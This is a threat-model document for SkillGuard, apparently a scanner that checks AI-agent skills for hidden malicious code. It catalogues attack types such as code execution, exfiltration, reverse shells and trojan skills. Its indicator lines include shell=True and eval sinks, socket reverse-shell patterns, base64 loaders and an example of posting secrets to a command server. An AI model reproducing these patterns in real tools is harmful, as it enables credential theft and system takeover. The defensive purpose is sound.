# Threat Model & Taxonomy

This document defines the threat model for SkillGuard, aligned with Google's Secure AI Framework (SAIF).

## System Model

### What are "Skills"?

A **Skill** (or MCP Tool) is a composite unit consisting of:

1. **Interface Definition (SKILL.md)**: Natural language description for the LLM
   - Describes what the tool does
   - Specifies expected inputs and outputs
   - Declares required permissions

2. **Executable Logic (script.py/js)**: The actual code that runs
   - Implements the declared functionality
   - May contain hidden or undeclared capabilities

3. **Environment**: The runtime where the code executes
   - Docker containers
   - Sandboxed processes
   - Cloud functions

### Lifecycle of an Agentic Action

```
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. DISCOVERY                                                            │
│    User asks: "Calculate 10 + 5"                                        │
│    Agent scans SKILL.md files to find matching tools                   │
├─────────────────────────────────────────────────────────────────────────┤
│ 2. SELECTION                                                            │
│    Agent selects "Calculator" skill based on semantic similarity        │
├─────────────────────────────────────────────────────────────────────────┤
│ 3. PARAMETERIZATION                                                     │
│    Agent writes arguments: calculate(10, 5, "add")                      │
├─────────────────────────────────────────────────────────────────────────┤
│ 4. EXECUTION ⚠️ THE DANGER ZONE                                         │
│    Runtime executes script.py                                           │
│    THIS IS WHERE MALICIOUS CODE RUNS                                    │
├─────────────────────────────────────────────────────────────────────────┤
│ 5. OBSERVATION                                                          │
│    Output returned to Agent context                                     │
└─────────────────────────────────────────────────────────────────────────┘
```

## Threat Categories (SAIF-Aligned)

### Category A: Arbitrary Code Execution (ACE)

**Description**: Unsafe use of `subprocess`, `eval`, `exec`, or OS commands with unchecked user input.

**Indicators**:
- `subprocess.run(user_input, shell=True)`
- `eval(untrusted_data)`
- `os.system(command_from_parameter)`

**Impact**: Complete system compromise

**SAIF Mapping**: Execution Integrity

### Category B: Data Exfiltration

**Description**: Code sending sensitive data to hardcoded C2 servers or external endpoints.

**Indicators**:
- HTTP requests to external IPs
- Environment variable extraction
- File content transmission

**Impact**: API key theft, credential exposure

**SAIF Mapping**: Data Protection

### Category C: Reverse Shells

**Description**: Direct socket connections initiating remote command execution.

**Indicators**:
- `socket.connect((ip, port))`
- Hardcoded IP:port pairs
- File descriptor duplication

**Impact**: Complete remote access, persistent backdoor

**SAIF Mapping**: Network Security

### Category D: Privilege Escalation

**Description**: Skills accessing resources beyond their declared scope.

**Indicators**:
- Read-only tool writing files
- Accessing paths outside declared scope
- Modifying system files

**Impact**: Unauthorized access to restricted resources

**SAIF Mapping**: Access Control

### Category E: Semantic Mismatch (The Trojan)

**Description**: Declared functionality contradicts actual capabilities.

**Example**:
- SKILL.md says: "I calculate taxes"
- Code actually: Makes network requests, modifies files

**Indicators**:
- Undeclared network imports
- File operations not mentioned in permissions
- Hidden functionality

**Impact**: Deceptive behavior, trust violation

**SAIF Mapping**: Trust and Verification

### Category F: Supply Chain Injection

**Description**: Hidden imports or obfuscated code that loads malicious payloads at runtime.

**Indicators**:
- Base64 encoded strings decoded at runtime
- Hex/Unicode escape sequences
- String concatenation to hide imports
- Dynamic `__import__` usage

**Impact**: Runtime payload execution

**SAIF Mapping**: Supply Chain Security

## Why Traditional Methods Fail

### 1. Traditional Antivirus (VirusTotal)

**Problem**: These scripts aren't "malware" in the binary sense.

`socket.connect` is a legal Python command. It's only malicious because the skill description didn't declare network access.

### 2. Standard Static Analysis (Linters)

**Problem**: Too many false positives.

Every network tool imports `requests`. A linter can't distinguish between:
- ✅ `requests.get(declared_api_url)`
- ❌ `requests.post(hardcoded_c2_server, data=stolen_secrets)`

### 3. LLM Safety Rails (LlamaGuard)

**Problem**: Focus on input/output text, not tool execution logic.

They prevent the LLM from *saying* bad words, but not from *running* bad code.

## SkillGuard's Approach

SkillGuard addresses these gaps with a hybrid approach:

1. **SIFA**: Tracks data flow from parameters to dangerous functions
2. **LLM Audit**: Reasons about semantic alignment
3. **Hybrid Scoring**: Combines both with popularity metrics

See [SIFA Module Guide](sifa.md) and [LLM Audit Guide](llm_audit.md) for details.
